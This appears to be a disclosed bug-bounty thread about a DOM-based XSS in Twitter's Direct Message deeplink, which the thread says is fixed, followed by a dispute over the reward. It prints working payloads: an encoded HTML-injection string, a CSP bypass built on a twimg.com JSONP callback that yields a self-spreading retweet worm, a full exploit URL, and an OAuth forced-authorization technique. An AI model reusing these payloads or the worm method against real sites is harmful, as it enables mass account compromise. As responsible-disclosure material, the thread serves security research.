  "vulnerability_information": "**Description:** \nBy using a specially crafted payload as the value of the text parameter in a Direct Message deeplink, a malicious user can inject arbitrary HTML tags and possibly run arbitrary JavaScript code on the \"twitter.com\" origin.\n\n## Steps To Reproduce:\n\n  1. Create a Direct Message deeplink by following the instructions on this [Twitter developer guide](https://developer.twitter.com/en/docs/direct-messages/welcome-messages/guides/deeplinking-to-welcome-message).\n  2. Use the following payload as the value for the text parameter:\n```\n%3C%3C/%3Cx%3E/script/test000%3E%3C%3C/%3Cx%3Esvg%20onload%3Dalert%28%29%3E%3C/%3E%3Cscript%3E1%3C%5Cx%3E2\n```\n  3. Tweet the deeplink you created. It should look like the following:\n```\nhttps://twitter.com/messages/compose?recipient_id=988260476659404801&welcome_message_id=988274596427304964&text=%3C%3C/%3Cx%3E/script/test000%3E%3C%3C/%3Cx%3Esvg%20onload%3Dalert%28%29%3E%3C/%3E%3Cscript%3E1%3C%5Cx%3E2\n```\n\n## Impact\n\nIt seems that the deployed CSP policy currently blocks the execution of arbitrary JavaScript code, however, arbitrary HTML tags can still be injection on `twitter.com` to carry out other kinds of attacks (i.e., deanonymization attacks, phishing, etc.). While you're in the process of verifying this, I'll be working on a bypass for the CSP policy in order to execute arbitrary JavaScript.\n\nThe hacker selected the **Cross-site Scripting (XSS) - DOM** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:\n\n**URL**\nhttps://twitter.com/fvofo0000001444/status/988278372894740480\n\n**Verified**\nYes\n\n",

      "message": "Sorry for the late reply. I can confirm this issue is now fixed. But I think the fix could be improved further. Right now, I can't terminate the script tag because the forward slash character \"/\" gets prepended with a double backslash `\\\\` (using `<<x>/script>` as a payload turns into `<\\\\/script>\\\\u00A0`). But just the fact that HTML tags are not being stripped out properly is concerning.\n\nIf an attacker could figure out a way to smuggle a forward slash without it being escaped, or if there is theoretically any other way to terminate an HTML tag without a literal forward slash, the current fix could be completely bypassed. So I think angle brackets \"<>\" should at least be escaped as `\\u003c\\u003e`.",

      "message": "Hi @andrewsorensen,\n\nI'm going to publish a write-up about this issue later this week. However, I wanted to make you aware that I've found a CSP bypass that could've turned this vulnerability into a fully-fledged XSS worm that executes on any modern web browser and can propagate throughout all active Twitter accounts.\n\nThe current Twitter CSP policy allows scripts from \"https://*.twimg.com\", and while the following JSONP endpoint \"https://syndication.twimg.com/timeline/profile?callback=\" prefixes the callback with a \"\\_\\_twttr\" prefix, this limitation can be bypassed by injecting an HTML element with this value \"\\_\\_twttr\" as an element ID.\n\nWhile the XSS vulnerability itself has already been fixed, if an attacker were to find a similar XSS issue, he could create a fully-fledged XSS worm using the following payload:\n```html\n</script><iframe id=__twttr src=/intent/retweet?tweet_id=1114986988128624640></iframe><script src=//syndication.twimg.com/timeline/profile?callback=__twttr/alert;user_id=12></script><script src=//syndication.twimg.com/timeline/profile?callback=__twttr/frames[0].retweet_btn_form.submit;user_id=12>\n```\n\n\nThe following is an exploit that would've leveraged this XSS issue alongside the CSP bypass in order to create the XSS worm:\n```\nhttps://twitter.com/messages/compose?recipient_id=988260476659404801&welcome_message_id=988274596427304964&text=%3C%3Cx%3E/script%3E%3C%3Cx%3Eiframe%20id%3D__twttr%20src%3D/intent/retweet%3Ftweet_id%3D1114986988128624640%3E%3C%3Cx%3E/iframe%3E%3C%3Cx%3Escript%20src%3D//syndication.twimg.com/timeline/profile%3Fcallback%3D__twttr/alert%3Buser_id%3D12%3E%3C%3Cx%3E/script%3E%3C%3Cx%3Escript%20src%3D//syndication.twimg.com/timeline/profile%3Fcallback%3D__twttr/frames%5B0%5D.retweet_btn_form.submit%3Buser_id%3D12%3E\n```\n\nNote: You can verify the CSP bypass by heading to \"https://twitter.com/i/cards/tfw/v1/1114986988128624640\" and executing this in the browser console (while logged inâ€”tested on latest Chrome):\n```javascript\ndocument.write(document.body.innerHTML.replace(/\\\\\\\\\\//g,'/'));\n```\n\nIf you would like to fix the CSP bypass in order to mitigate the risk of such issues in the future, I might consider delaying the publication of my full write-up until then.\n\nLet me know what you think,\nThanks!",

      "message": "Hi @andrewsorensen,\n\nI think the impact of this issue is even more severe than originally thought. An attacker could have exploited this issue to force a user to authorize any malicious app to access the user's account with full permissions. This is simply possible by loading the following endpoint `https://twitter.com/oauth/authorize?oauth_token=1YBDSQAAAAAA4_EbAAABaiyr63w` in an iframe element and then automatically submitting the form with the ID \"oauth_form\" within that page.\n\nAnd this would not have required any user interaction whatsoever. The only caveat is that the \"oauth_token\" value is valid for one use only and has a relatively short expiry time. But this is not much of a problem as this XSS would get triggered as soon as the malicious tweet loads on any user's timeline, and an attacker could post (and propagate) as many tweets as needed to compromise any number of accounts. \n\nI've put together an example exploit for this kind of attack in the following tweet (which attempts to load two other Twitter cards with additional payloads to silently execute such attack):\nhttps://twitter.com/kyoko6516713624/status/1118609831814934528\n\nYou could still verify this possibility even though the XSS has been fixed. That being said, I think this XSS issue affects a critical part of the app and should probably have been rewarded higher than the typical reward (for reference, this is obviously more severe than #85624).\n\nLet me know if it'd be possible to reassess the impact of this issue in light of this new information.\nThanks!",

Although I understand your point, it's not always feasible that the impact of an issue is fully known prior to it being fixed/rewarded/closed (especially with very challenging issues like this one). The priority is to patch vulnerabilities before they're exploited, so it's reasonable to report bugs before the full impact has been determined and to issue rewards based on the highest potential impact. That said, I still believe this should not have been rewarded like any typical XSS issue at the time as it affected a very critical/core component of the app.\n\nRegards!",

The challenge is that an entire year has elapsed since we accepted and rewarded this issue, which makes it difficult for us to revisit that payout decision (which is already something we only do a very select basis).",

Yet at the same time, I also think this is nothing short of an exceptional case all things considered (complexity, impact/damage potential, time & effort spent bypassing restrictions, etc.)â€”this is quite as bad as an XSS could ever get. So it'd be much appreciated if you would reconsider (even though the timing was rather unfortunate)....",
